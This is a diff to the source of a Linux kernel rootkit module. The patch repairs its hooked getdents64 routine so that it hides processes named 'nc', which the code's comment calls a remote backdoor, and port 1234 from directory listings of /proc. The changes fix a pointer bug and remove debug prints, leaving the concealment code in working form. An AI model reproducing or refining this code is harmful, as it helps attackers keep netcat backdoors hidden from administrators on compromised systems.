@@ -24,7 +24,7 @@
 #define HIDE_SIG 16
 
 // for process hiding
-#define HIDE_PROC "nc -l 1234" // for remote backdoor
+#define HIDE_PROC "nc" // for remote backdoor
 
 // for port hiding
 #define HIDE_PORT "04D2" // 1234 for hex
@@ -95,6 +95,7 @@ void getPathnameFromFD(unsigned int fd, char *pathname, char *buf)
 // for checking a process name against HIDE_PROC
 int checkProcName(long pid)
 {
+	//printk(KERN_INFO "In checkProcName, %s\n",pid_task(find_vpid(pid),PIDTYPE_PID)->comm);
 	if (strcmp(pid_task(find_vpid(pid),PIDTYPE_PID)->comm,HIDE_PROC) == 0)
 		return 1;
 	return 0;
@@ -176,7 +177,7 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	struct fdtable *files_table;
 	struct path file_path;
 	char pbuf[256], *pathname = NULL;
-	long *pid = NULL;
+	long pid = 0; // uninited
 
 	// run real getdents64 
 	result = (*orig_getdents64)(fd,dirp,count);
@@ -203,10 +204,10 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 		d = (struct linux_dirent64 *) (kdirp + bp);
 		// process hiding
 		if (!strcmp(pathname,"/proc")) {
-			printk(KERN_INFO "After /proc check,%i\n",strlen(pathname));
-			kstrtol(d->d_name,10,pid);
-			printk(KERN_INFO "After pid convert,%li\n",*pid);
-			if (checkProcName(*pid)) {
+			//printk(KERN_INFO "After /proc check,%s\n",d->d_name);
+			kstrtol(d->d_name,10,&pid);
+			//printk(KERN_INFO "Before pid check,%ld\n",pid);
+			if ((pid > 0) && checkProcName(pid)) {
 				printk(KERN_INFO "Found pid to hide\n");
 				memmove(kdirp + bp,kdirp + bp + d->d_reclen,
 					result - bp - d->d_reclen);
@@ -225,7 +226,7 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 				}
 			}
 		}
-		bp += d->d_reclen;
+		bp += d->d_reclen; // TODO should go in loop
 	}
 
 	// copy from kernel to userspace
